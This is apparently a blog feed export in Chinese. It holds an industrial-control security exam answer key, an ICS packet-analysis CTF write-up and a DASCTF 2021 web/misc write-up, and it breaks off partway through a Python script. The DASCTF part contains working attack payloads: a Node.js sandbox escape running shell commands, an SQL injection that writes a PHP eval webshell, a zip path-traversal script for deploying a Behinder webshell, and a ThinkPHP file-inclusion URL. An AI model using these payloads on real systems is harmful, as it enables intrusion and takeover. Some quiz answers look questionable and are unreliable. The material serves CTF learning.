客户</p><p>IOT恶意软件增长趋势最快得的家族，是以下哪个？（C）</p><p>A Mirai</p><p>B bitcoin</p><p>C Gafgyt</p><p>D Tsunami</p><p>攻击者可能利用不必要的 extproc外部程序调用功能获取对系统的控制权，威胁系统安全。关闭 Extproc功能需要修改 TNSNAMES.ORA和 LISTENER.ORA文件删除一下条目，其中有一个错误的请选择出来（A）。</p><p>A sys_ertproc</p><p>B PLSExtproc</p><p>C extproc</p><p>D icache_extproc</p><p>当一个应用系统被攻击并受到了破坏后，系统管理员从新安装和配置了此应用系统，在该系统重新上线前管理员不需查看（C）</p><p>A 用户账户和权限的设置</p><p>B 访问控制列表</p><p>C 审计记录</p><p>D 系统服务配置情况</p><p>简单的攻击也由很多步骤组成，为探测一个安全事故，需要观测多个事件并在其中寻找 规律，然而，目前设计成型的事件关联系统并不适合在控制系统中使用，因此在工业控制系统网络中探测更加高级的攻击威胁是巨大的挑战，下列不属于工业控制系统信息高级威胁探测技术的是：（B）</p><p>A IT与OT系统的关联性；</p><p>B 异常行为探测；</p><p>C 数据丰富过程；</p><p>D 事件关联机制；</p><p>工业控制系统体系架构的脆弱性直接源自工业控制系统的基本架构，现代工业系统所使用的工控架构，与20世纪80年代和90年代使用的架构相比，原则上是没有太大区别。下面哪一项不属于工业控制系统系统架构脆弱性：（D）</p><p>A 在工业控制系统系统架构中，工控系统的活动组件之间缺乏认证；</p><p>B 在工业控制系统系统架构中，管理网络与控制网络之间的弱分离；</p><p>C 在工业控制系统系统架构中，对网络负载均衡和冗余的较少关注；</p><p>D 在工业控制系统系统架构中，经常使用安全设备的缺省配置；</p><p>通配符掩码（C）等价于关键字“any”。</p><p>A 1.1.1.1</p><p>B 255.1.1.1</p><p>C 255.255.255.255</p><p>D 0.0.0.0</p><p>DNS由于其在Internet上的战略角色，容易成为黑客攻击的目标。下面哪种攻击使用递归查询来毒化DNS服务器的缓存？（A）</p><p>A DNS欺骗</p><p>B 社会工程</p><p>C 操纵主机文件</p><p>D 域名诉讼</p><p>示例代码展示了哪一种漏洞？ char<em>ptr=(char</em>)malloc(SIZE); … if(abrt){ free(ptr); } … free(ptr);（B）</p><p>A 空指针引用</p><p>B 双重释放</p><p>C 释放后使用</p><p>D 内存泄露</p><p>针对Mysql的SQL注入，可以使用什么函数来访问系统文件？（B）</p><p>A load file infile</p><p>B load_file</p><p>C load file</p><p>D load file_infile</p><p>在下图给出的加密过程中mi,i=1,2,…,n表示明文分组，ci,i=1,2,…,n表示密文分组，iv表示初始序列，k表示密钥，e表示分组加密。该分组加密过程的工作模式是（ A ）。</p><p>A pcbc</p><p>B ctr</p><p>C cfb</p><p>D ecb</p><p>下面哪个不是控制系统的基本要素？（B）</p><p>A 调节器</p><p>B 被控对象</p><p>C 控制器</p><p>D 传感器</p><p>在 UNIX 操作系统中，把输入／输出设备看作是？（B）</p><p>A 目录文件</p><p>B 特殊文件</p><p>C 索引文件</p><p>D 普通文件</p><p>应用网关防火墙的逻辑位置处在 OSI中的哪一层？（C）</p><p>A 物理层</p><p>B 链路层</p><p>C 应用层</p><p>D 传输层</p><p>SG-I6000系统中安全管理模块，安全监测的指标不包括（ C ）。</p><p>A 保密检测系统安装率</p><p>B 敏感信息检查执行率</p><p>C 日待办接收总数</p><p>D 感染病毒客户端数</p><p>下列不属于监测工业控制系统信息安全域的途径是：（C）</p><p>A 推测型监视</p><p>B 直接监视</p><p>C 间接监视</p><p>D 日志采集</p><p>ipsec属于（ C ）的安全解决方案。</p><p>A 传输层</p><p>B 应用层</p><p>C 网络层</p><p>D 物理层</p><p>作为一名信息安全专业人员，你正在为某公司设计信息资源的访问控制策略。由于该公司的人员流动性较大，你准备根据用户所属的组以及在公司中的职责来确定对信息资源的访问权限，最应该采用下列哪一种访问控制模型？（C）</p><p>A 最小特权（Least Privilege）</p><p>B 强制访问控制（MAC）</p><p>C 基于角色访问控制（RBAC）</p><p>D 自主访问控制（DAC）</p><p>如下代码会导致什么样的安全问题？ char*stored_password=””; readPassword(stored_password); if(safe_strcmp(stored_password,user_password)) //Accessprotectedresources }    （A）</p><p>A 登录绕过，攻击者只要提供一个空字符串的user_password，就可以绕过该验证</p><p>B 信息泄密，因为stored_password没有加密</p><p>C 缓冲区溢出，字符串user_password没有长度校验</p><p>D readPassword存在漏洞，没有对用户输入进行过滤</p><p>蠕虫、木马、黑客攻击会利用工业控制系统的脆弱性对系统发动攻击，下列哪种工业控制系统脆弱性不可被利用发动包重放攻击：（B）</p><p>A 工业控制系统的通信协议的脆弱性；</p><p>B 工业控制系统运维管理的脆弱性；</p><p>C 工业控制系统网络的脆弱性；</p><p>D 工业控制系统应用软件脆弱性的脆弱性；</p><p>VTP 修剪的作用不包括（D）。</p><p>A 减少不必要的组播信息</p><p>B 减少不必要的广播信息</p><p>C 节约链路带宽</p><p>D 减少VLAN数量</p><p>包过滤技术防火墙在过滤数据包时，一般不关心（ C ）。</p><p>A 数据包的协议类型</p><p>B 数据包的目的地址</p><p>C 数据包的内容</p><p>D 数据包的源地址</p><p>采用 debug ip ospf packet 命令可以显示收到的 ospf 包的信息，其中 ospf 认证类型 字段不包括以下的（A）。</p><p>A 3-ip 认证</p><p>B 0-不认证</p><p>C 2-MD5 认证</p><p>D 1-明文认证</p><p>下面哪个选项属于目前SACDA系统网络的现状：（A）</p><p>A 网络边界不够清晰</p><p>B 原有IP数据网信息安全技术能满足要求</p><p>C 网络之间都不能互相访问</p><p>D 系统漏洞不多</p><p>syslog 机制主要依据两个重要的文件:syslogd 和（D）。</p><p>A log</p><p>B sys.conf</p><p>C conf</p><p>D syslog.conf</p><p>ICMP 协议工作在（C）。</p><p>A 传输层</p><p>B 应用层</p><p>C 网际层</p><p>D 控制层</p><p>用 show cdp neighbors detail 命令，不能看到以下哪种信息（B）。</p><p>A 对端设备 IOS 版本</p><p>B 本设备 IP 地址</p><p>C 对端设备 IP 地址</p><p>D 对端设备 ID</p><p>在 P2DR2 安全模型中，“Dt”代表（D）。</p><p>A 系统做出响应所需时间</p><p>B 攻击成功所需时间</p><p>C 安全体系建设所需时间</p><p>D 系统检测到攻击行为所需时间</p><p>下述哪个迹象发生时，工业控制系统不用向有关人员或角色发出警报：（A）</p><p>A 预期之内的用户发起了资源或服务请求</p><p>B 日志记录在无法解释的情况下被删除或修改</p><p>C 审计功能被禁止或修改</p><p>D 当发生异常资源消耗</p><p>如下代码的作用是什么（C）disable_functions=phpinfo,eval,passthru,exec,system</p><p>A 限定系统可访问目录范围</p><p>B 过滤敏感字符，预防SQL注入攻击</p><p>C 限制这些函数的运行，降低命令执行攻击的风险</p><p>D 限制文件操作，保护系统关键配置文件</p><p>tomcat后台数据包中认证的字段是（A）</p><p>A Authorization：Basic XXX</p><p>B user-Agent</p><p>C auth-oa</p><p>D author：Basic XXX</p><p>基于公开密钥的数字签名算法对消息进行签名和验证时，正确的签名和验证方式是（A）。</p><p>A 发送方用自己的私有密钥签名，接收方用发送方的公开密钥验证</p><p>B 发送方用接收方的公开密钥签名，接收方用自己的私有密钥验证</p><p>C 发送方用自己的公开密钥签名，接收方用发送方的公开密钥验证</p><p>D 发送方用自己的私有密钥签名，接收方用自己的私有密钥验证</p><p>采用 TFTP 命令对交换机配置进行安全备份时，需要（B）、配置文件名等参数。</p><p>A 源 IP 地址</p><p>B TFTP 服务器 IP 地址</p><p>C 源 MAC 地址</p><p>D 物理地址</p><h2 id="多选题"><a href="#多选题" class="headerlink" title="多选题"></a><strong>多选题</strong></h2><p>防火墙 trust域中的客户机通过 nat访问 untrust中的服务器的 ftp服务，已经允许客户机访问服务器的 tcp21端口，但只能登陆到服务器，却无法下载文件，以下解决办法中可能的是：（ CDA ）</p><p>A 在 trust untrust域间配置中启用 detect ftp</p><p>B FTP工作方式为 passive模式时，修改 untrust trust域间 in方向的默认访问策略为允许</p><p>C 修改 trust untrust域间双向的默认访问策略为允许</p><p>D FTP工作方式为 port模式时，修改 untrust trust域间 in方向的默认访问策略为允许</p><p>为了防止SQL注入，下列特殊字符（BDAC）需要进行转义。</p><p>A ；（分号）</p><p>B ‘（单引号）</p><p>C ”（双引号）</p><p>D %（百分号）</p><p>攻击者提交请求<a href="http://www.xxxyzz.com/displaynews.asp?id=772%E2%80%99%EF%BC%8C%E7%BD%91%E7%AB%99%E5%8F%8D%E9%A6%88%E4%BF%A1%E6%81%AF">http://www.xxxyzz.com/displaynews.asp?id=772’，网站反馈信息</a> 为 Microsoft OLE DB Provider for ODBC Drivers错误 ‘80040e14’，能够说明该网 站（ABDC）</p><p>A 数据库为Access</p><p>B 网站服务程序没有对 id进行过滤</p><p>C 该网站可能存在 SQL注入漏洞</p><p>D 数据库表中有个字段名为id</p><p>你作为单位网站运维人员，近期发现网站页面经常被植入广告，此时你应采取（ CA ）技术措施。</p><p>A 检查Web应用程序是否存在SQL注入漏洞</p><p>B 将防火墙更换为更高性能的设备</p><p>C 分析Web服务器日志</p><p>D 检查Web应用程序是否存在跨站脚本漏洞</p><p>已知某单位的网站提供网上审批业务，则该网站服务器潜在的安全威胁是（ BDA ）。</p><p>A 社会工程攻击</p><p>B 口令暴力猜解</p><p>C Telnet服务会话猜测</p><p>D HTTP明文窃听</p><p>为了通过HTTP错误代码来显示不同错误页面，则需要修改WebLogic的web.xml中（DCB）元素。</p><p>A error-type</p><p>B location</p><p>C error-code</p><p>D error-page</p><p>如果服务器上的所有html页面都已经被挂马，以下哪些方法可以快速清除恶意代码？（BCD）</p><p>A 重新编写html页面</p><p>B 使用专门软件清除html页面中的代码</p><p>C 使用备份还原html页面</p><p>D 删除所有被修改过得html页面</p><p>用 THC组织的 Oracle的工具，通过 sniffer方式抓取数据库的认证信息可有效破解 Oracle密码，以下哪些数据是必须获取的？（CAB）</p><p>A AUTH_PASSWORD</p><p>B 用户名</p><p>C AUTH_SESSKEY</p><p>D 实例名</p><p>生产服务器通常都是 UNIX平台，资产价值最高，不直接连接外部网络，主要的安全需求是?（BAC）</p><p>A 账号口令</p><p>B 访问控制</p><p>C 权限管理和补丁管理</p><p>D 数据过滤</p><p>你是单位网络信息安全维护技术人员，网络一直运行良好。近期，不知什么原因，经常有用户报告网络变慢，有时网页刚刚打开一半便突然出错或不再返回剩余内容。以下措施可用于进一步追查原因的是（ CBA ）。</p><p>A 检查审计设备记录</p><p>B 检查是否有ARP地址欺骗</p><p>C 使用嗅探器查看网络数据包</p><p>D 检查防火墙ACL列表</p><p>在WebLogic中，Web应用的根目录一般由（CA）文件的context-root元素定义。</p><p>A weblogic.xml</p><p>B webapp.xml</p><p>C application.xml</p><p>D Web-application.xml</p><p>以下关于SYNFlood和SYNCookie技术的哪些说法是不正确的?( AD )</p><p>A SYNFlood攻击主要是通过发送超大流量的数据包来堵塞网络带宽</p><p>B SYNCookie技术在超大流量攻击的情况下可能会导致网关设备由于进行大量的计算而失效</p><p>C SYNCookie技术的原理是通过SYNCookie网关设备拆分TCP三次握手过程，计算每个TCP连接的Cookie值，对该连接进行验证</p><p>D 以上都正确</p><p>在OSPF协议中，对于DR的描述，下列正确的有哪些？( CDA )</p><p>A DR和BDR之间也要建立邻接关系</p><p>B 若两台路由器的优先级值不同，则选择优先级值较小的路由器作为DR</p><p>C 本广播网络中所有的路由器都将共同与DR选举</p><p>D 若两台路由器的优先级值相等，则选择Router ID大的路由器作为DR</p><p>APP源码安全漏洞主要有（DCAB）。</p><p>A so保护漏洞</p><p>B 调试设置漏洞</p><p>C Dex保护漏洞</p><p>D 代码混淆漏洞</p><p>用哪些技术措施可以有效地防御通过伪造保留IP地址而实施的攻击（BDC）</p><p>A 数据加密</p><p>B 边界路由器上设置ACLs</p><p>C 防火墙策略设置</p><p>D 入侵检测系统</p><p>如果数据库不需要远程访问，可以禁止远程 tcp/ip连接，以增强安全性。可选择的有效方法：( DB )</p><p>A 在/etc/my.cnf下添加 remoteConnnect=disable</p><p>B 在 mysqld服务器中参数中添加 –skip-networking启动参数来使 mysql</p><p>C 禁止 tcp/ip协议的使用</p><p>D 用防火墙封堵数据库侦听端口避免远程连接</p><p>当使用邮件程序如OUTLOOK、FOXMAIL收发邮件时，最有可能受到的攻击是（ AD ）。</p><p>A 网络窃听</p><p>B SQL注入</p><p>C 网络钓鱼</p><p>D 木马攻击</p><p>下列对于PAP协议描述正确的是？（ BD ）</p><p>A 使用三步握手方式完成验证</p><p>B 使用两步握手方式完成验证</p><p>C 使用加密密码进行验证</p><p>D 使用明文密码进行验证</p><p>有两个账号001和002；经检查发现002账号名被添加到/etc/cron.d/cron.deny文件中，那么下面说法正确的是（CBA）</p><p>A 删除/etc/cron.d/cron.deny文件后，001和002用户都不可以创建、编辑、显示和删除crontab文件</p><p>B 002用户可以创建、编辑、显示和删除crontab文件</p><p>C 001用户可以创建、编辑、显示和删除crontab文件</p><p>D 删除/etc/cron.d/cron.deny文件后，001和002用户都可以创建、编辑、显示和删除crontab文件</p><p>以下哪些服务严格禁止工业控制系统面向互联网开通？（BACD）</p><p>A FTP</p><p>B HTTP</p><p>C Telnet</p><p>D E-MAIL</p><p>驻留在多个网络设备上的程序在短时间内同时产生大量的请求消息冲击某 Web 服务器，导致该服务器不堪重负，无法正常响应其他合法用户的请求，这属于（C）</p><p>A 网上冲浪</p><p>B 中间人攻击</p><p>C DDoS攻击</p><p>D MAC攻击</p><p>为IPsec服务的总共有三个协议分别是？（DAC ）</p><p>A ESP协议</p><p>B SET协议</p><p>C IKE协议</p><p>D AH协议</p><p>Solarid系统中，攻击者在系统中增加账户会改变哪些文件？（CB）</p><p>A hosts</p><p>B passwd</p><p>C shadow</p><p>D inetd,conf</p><p>mimikatz是一款提取windows口令的工具，它不能从（DAB）进程中提取口令。</p><p>A iexplore</p><p>B svchost</p><p>C lsass</p><p>D explorer</p><p>IT系统软件设计中应当考虑并执行安全审计功能，详细记录访问信息的活动，包括（BACD ）。</p><p>A 应用系统应当配置单独的审计数据库，审计记录应单独存放，并设置严格的边界访问控制，只有安全管理人员才能够看到审计记录</p><p>B 记录的活动以是否有数据的修改、应用程序的异常关闭、异常删除触发</p><p>C 信息系统的审计功能包括：事件日期、时间、发起者信息、类型、描述和结果</p><p>D 应用系统的审计进程为后台处理，与应用系统运行同步进行，并且对于审计进程应当涉及相应的守护进程，一旦出现异常停止系统可重新启动审计进程，从而保障审计的“完整性”</p><p>Oracle中如何设置 audit trail审计，正确的说法是：（ DCB ）</p><p>A Oracle不支持对 audit trail的审计</p><p>B 在设置 audit trail审计前，要保证已经打开 Oracle的审计机制</p><p>C 以 SYSDBA身份使用 AUDIT ALL ON SYS.AUD$ BY ACCESS，语句对 audit trail审计</p><p>D 在 init.ora文件中设置“audit_trail = true”或者“audit_trail = db”</p><p>如果 <a href="http://xxx.com/news.action?id=1">http://xxx.com/news.action?id=1</a> ?id=1 and 1=1 ?id=1 and len(‘a’)=1 ?id=1 and substring(‘ab’,0,1)=’a’ 返回结果均相同，可以判断出服务器 （DA）</p><p>A 使用了mysql数据库</p><p>B 使用了SQL server数据库</p><p>C 使用了Oracle数据库</p><p>D 使用了Strut2框架</p><h2 id="判断题"><a href="#判断题" class="headerlink" title="判断题"></a><strong>判断题</strong></h2><p>通常情况下，后应用的组策略配置将覆盖之前先应用的组策略配置。</p><p>正确答案：对</p><p>P2DR2 安全模型包含安全策略、防护、检测、响应、恢复这五个环节。</p><p>正确答案：对</p><p>IP 头中需要指明发送方和接收方的源端口号和目的端口号。</p><p>正确答案：错</p><p>为了应用 VTP 协议，需要先创建一个 VTP 管理域，为了使管理域更安全，域中每个交 换机都需要配置域名和口令，并且域名和口令必须相同。</p><p>正确答案：对</p><p>RIP 协议中，路由器上配置被动接口，在被动接口上可以完全阻止发送路由更新,从而 节省网络带宽。</p><p>正确答案：对</p><p>RIP 协议是最早的距离矢量路由协议，由于更为高级路由协议的出现，它因为不具备 复杂的功能而被称为“即将被淘汰的协议”</p><p>正确答案：错</p><p>RIP 协议中，路由器上配置被动接口，在被动接口上可以完全阻止发送路由更新,从而 节省网络带宽。</p><p>正确答案：对</p><p>通常情况下，后应用的组策略配置将覆盖之前先应用的组策略配置。</p><p>正确答案：对</p><p>P2DR2 安全模型包含安全策略、防护、检测、响应、恢复这五个环节。</p><p>正确答案：对</p><p>ICMP 协议，又称互联网控制消息协议，其目的是用于 TCP/IP 网络中发送控制消息， 提供可能发生在通信环境中的问题反馈，属于 IP 层协议。</p><p>正确答案：对</p><p>CDP 协议是一种设备发现协议，它通过直连的两个设备之间定期发送 hello 信息来维 持邻居关系。</p><p>正确答案：对</p><p>为了应用 VTP 协议，需要先创建一个 VTP 管理域，为了使管理域更安全，域中每个交 换机都需要配置域名和口令，并且域名和口令必须相同。</p><p>正确答案：对</p><p>ECC 与 RSA 相比，可以用少得多的比特大小取得和 RSA 相等的安全性，因此可以减少 开销。</p><p>正确答案：对</p><p>通配符掩码中的“1”表示忽略 IP 地址中对应的位，而“0”则表示该位必须匹配。</p><p>正确答案：对</p><p>在特定的情况下，当路由器检测到一台机器使用非优化路由的时候，它会向该主机发 送一个 ICMP 重定向报文，请求主机改变路由。</p><p>正确答案：对</p><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a><strong>CTF</strong></h1><h2 id="遭到黑客攻击"><a href="#遭到黑客攻击" class="headerlink" title="遭到黑客攻击"></a>遭到黑客攻击</h2><blockquote><p>某工厂PLC遭受黑客攻击，工程师通过交换机捕获了这段攻击流量1.pcap，试分析流量中黑客攻击留下的flag<br>请将答案包裹flag{XXXX}<br><a href="https://pan.baidu.com/s/1T_9lg9pHEL0FrQoVwGuiIw"><strong>附件</strong></a>（提取码：08un）</p></blockquote><p>根据题目我们先看看tcp流是否藏有什么有用信息，进而发现了一串可疑的莫斯码，解密得到flag：flag{HACKFUN}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202109091800001.png"></p><h2 id="工控网络遭到攻击"><a href="#工控网络遭到攻击" class="headerlink" title="工控网络遭到攻击"></a>工控网络遭到攻击</h2><blockquote><p>假如你是某攻击者入侵了菜工厂工控网络，并得到了scada与PLC交互的流量2.pcap，已知这段流量中float值125.5代表传送带转速，请分析出这个值所在寄存器的起始位置地址?<br>请将答案包卖flag{XXX}<br><a href="https://pan.baidu.com/s/1UzeIo4rYmpg6mx98b1fNUQ"><strong>附件</strong></a>（提取码：0gyl）</p></blockquote><p>考察西门子S7通信协议底层原理及抓包分析</p><p>猜测解题思路应该是首先我们需要了解一下S7协议的原理是啥，第几位，对应的什么功能，然后找到数据传输位，那一位记录下来就是了……</p><p>结果最后听说flag就在tcp第二个流里的那字符串flag{INGFORFUN}（这个就是S7流量里面？</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202109091800021.JPG"></p><h2 id="工控协议分析"><a href="#工控协议分析" class="headerlink" title="工控协议分析"></a>工控协议分析</h2><blockquote><p><a href="https://pan.baidu.com/s/1jMwePTPdPuvPFNiQDFxSxg"><strong>附件</strong></a>（提取码：jg8n）</p></blockquote><p>去年的原题，甚至flag都没改，考察s7comm协议（但是去年基本全程摸鱼没啥印象导致比赛的时候没做出来.jpg<br>直接过滤s7comm，根据协议找到长度为91的那个字符就是对应的flag：flag{iloveS7Comm}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202109091800031.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th</title>
      <link href="2021/08/02/2021DASCTF%20July%20X%20CBCTF%204th/"/>
      <url>2021/08/02/2021DASCTF%20July%20X%20CBCTF%204th/</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h3><blockquote><p>你真的会 nodejs 吗？</p></blockquote><p>随便注册一个号登录进去，然后再随便添加个项目，并在项目中随便添加个接口。</p><p>接着进入设置找到全局mock脚本，进行远程代码执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 查看目录</span><br><span class="line">const sandbox &#x3D; this</span><br><span class="line">const ObjectConstructor &#x3D; this.constructor</span><br><span class="line">const FunctionConstructor &#x3D; ObjectConstructor.constructor</span><br><span class="line">const myfun &#x3D; FunctionConstructor(&#39;return process&#39;)</span><br><span class="line">const process &#x3D; myfun()</span><br><span class="line">mockJson &#x3D; process.mainModule.require(&quot;child_process&quot;).execSync(&quot;ls &#x2F;&quot;).toString()</span><br><span class="line"># cat flag</span><br><span class="line">const sandbox &#x3D; this</span><br><span class="line">const ObjectConstructor &#x3D; this.constructor</span><br><span class="line">const FunctionConstructor &#x3D; ObjectConstructor.constructor</span><br><span class="line">const myfun &#x3D; FunctionConstructor(&#39;return process&#39;)</span><br><span class="line">const process &#x3D; myfun()</span><br><span class="line">mockJson &#x3D; process.mainModule.require(&quot;child_process&quot;).execSync(&quot;cat &#x2F;ffffffflllllaggggg&quot;).toString()</span><br></pre></td></tr></table></figure><p>保存后访问mock地址得到flag</p><h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h3><blockquote><p>简简单单cat flag</p><p>hint：管理员曾访问过flag</p></blockquote><p>根据hint可知flag文件名在日志里，于是访问 <code>/var/log/nginx/access.log</code> 得到flag文件名</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021080212202545886.png"></p><p>接着我们就通过加个不可见字符（例如 <code>%ff</code>）即可绕过得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210802127748551.png"></p><h3 id="easythinkphp"><a href="#easythinkphp" class="headerlink" title="easythinkphp"></a>easythinkphp</h3><blockquote><p>easythinkphp</p></blockquote><p>检测发现存在 thinkphp 3.x Log RCE 和 thinkphp 3.x 日志泄露 这两个洞，直接一键getshell后成功连接上蚁剑</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021080212145646.png"></p><p>最后在根目录下找到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202108021295923155.jpg"></p><p>由于出题人权限没设置好，可以直接包含到 /flag（不过这也难免，除非只让rce</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?m&#x3D;Home&amp;c&#x3D;Index&amp;a&#x3D;index&amp;value[_filename]&#x3D;&#x2F;flag</span><br></pre></td></tr></table></figure><h3 id="jspxcms"><a href="#jspxcms" class="headerlink" title="jspxcms"></a>jspxcms</h3><blockquote><p><a href="http://sdejkwdfnewi3f2jr32d3edfewd.dasctf.node4.buuoj.cn:82/">http://sdejkwdfnewi3f2jr32d3edfewd.dasctf.node4.buuoj.cn:82/</a><br>靶机每十分钟重置一次。</p></blockquote><p>站点底下发现有个后台登录地址，Google搜索得知默认账号为admin；密码为空<br>接着我们就成功进入后台，通过搜索jspxcms后台漏洞得知是<a href="https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/"><strong>zip解压功能⽬录穿越漏洞</strong></a><br>于是我们找到上传点，利用网上的一个冰蝎🐎构造war包（做了限制执行不了jsp文件) 然后写个脚本生成目录穿越的zip进行上传，接着将其解压，最后即可访问目录穿越的文件 <code>/harvey/shell.jsp</code> </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202108021247154.png"></p><p>附上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">war = <span class="built_in">open</span>(<span class="string">&#x27;harvey.war&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">zipFile = zipfile.ZipFile(<span class="string">&quot;harvey.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)</span><br><span class="line">info = zipfile.ZipInfo(<span class="string">&quot;harvey.zip&quot;</span>)</span><br><span class="line">zipFile.writestr(<span class="string">&quot;../../../harvey.war&quot;</span>, war)</span><br><span class="line">zipFile.close()</span><br></pre></td></tr></table></figure><p>最后我们通过冰蝎成功连接并找到flag（PS：冰蝎默认密码为rebeyond）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202108021255971.png"></p><h3 id="cybercms"><a href="#cybercms" class="headerlink" title="cybercms"></a>cybercms</h3><blockquote><p>赛博CMS，只为安全而生</p><p>hint：信息搜集是一个web手必备的技能</p></blockquote><p>后台注入</p><p>找到后台 <code>/admin/login.php</code>，试了下常见的弱口令无果，于是尝试抓包，上传🐎</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user&#x3D;admin&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;selselectect&#x2F;**&#x2F;0x3c3f70687020406576616c28245f504f53545b27686172766579275d293b3f3e,1,1,1,1&#x2F;**&#x2F;into&#x2F;**&#x2F;outfoutfileile&#x2F;**&#x2F;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;har.php&#39;&#x2F;**&#x2F;%23&amp;password&#x3D;hex&amp;code&#x3D;&amp;submit&#x3D;true&amp;submit.x&#x3D;20&amp;submit.y&#x3D;26</span><br><span class="line"></span><br><span class="line"># http:&#x2F;&#x2F;4b3d486c-68c9-4766-9522-03bc3f5367eb.node4.buuoj.cn:81&#x2F;harvey.php</span><br><span class="line"># 密码：harvey</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202108021241278.png"></p><p>最后蚁剑连接得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210802126568771.png"></p><h3 id="jj’s-camera"><a href="#jj’s-camera" class="headerlink" title="jj’s camera"></a>jj’s camera</h3><blockquote><p>jj在某次网络安全活动中发现了个黑客做的网站，请使用https访问站点</p><p>hint：网上能搜到源码，仅修改了前端ui，注意服务器的响应</p></blockquote><p>%00 截断 + 文件写入</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><!--这哪是CTF呀，分明就是ACM！--><!--非OI选手哭了！--><h3 id="red-vs-blue"><a href="#red-vs-blue" class="headerlink" title="red_vs_blue"></a>red_vs_blue</h3><blockquote><p>红队和蓝队将开展66轮对抗，你能预测出每轮对抗的结果吗？ nc连接</p></blockquote><p>nc连接得知是连续66次盲猜答对红蓝队即可得到flag，但是它每轮都有时间限制，在较短的时间内手工解出是不太可能的，所以我们需要写脚本跑出来flag</p><hr><p>Here are 66 AWD Games will begin!<br>The winner is between Red Team and Blue Team<br>To get the flag if you predict the results of all games successfully!</p><hr><p>附上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25611</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">res = [<span class="string">&#x27;r&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>)]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p.sendafter(<span class="string">&#x27;choose one [r] Red Team,[b] Blue Team:\n&#x27;</span>,res[i],timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># print(res[i])</span></span><br><span class="line">    ss = p.recvuntil(<span class="string">&#x27;Game&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> ss==<span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">        ss = p.recvuntil(<span class="string">&#x27;Play again? (y/n): &#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># print(ss)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;The result Blue Team&#x27;</span> <span class="keyword">in</span> ss:</span><br><span class="line">        res[i]=<span class="string">&#x27;b&#x27;</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b&#x27;The result Red Team&#x27;</span> <span class="keyword">in</span> ss:</span><br><span class="line">        res[i]=<span class="string">&#x27;r&#x27;</span></span><br><span class="line">        i += <span 